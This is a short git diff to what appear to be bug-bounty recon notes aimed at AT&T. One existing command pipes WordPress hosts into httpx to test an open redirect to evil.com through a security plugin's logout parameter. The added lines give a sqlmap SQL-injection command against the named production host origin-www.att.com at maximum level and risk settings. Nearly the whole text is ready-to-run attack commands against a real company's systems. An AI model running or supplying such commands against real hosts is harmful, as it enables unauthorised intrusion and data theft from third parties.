@@ -72,3 +72,9 @@ https://github.com/search?o=desc&q=att.com&s=indexed&type=Code
 ```
  cat status.txt | grep "WordPress" | cut -d ' ' -f1 | httpx -path "/?aiowpsec_do_log_out=1&after_logout=https://evil.com" -sc --title -location
 ```
+
+## sitemap.xml SQLi
+
+```
+python sqlmap.py -u "http://origin-www.att.com/sitemap.xml?offset=1" -p offset --level 5 --risk 3 --dbms=MySQL --hostname --test-filter="MySQL >= 5.0.12 stacked queries"
+```
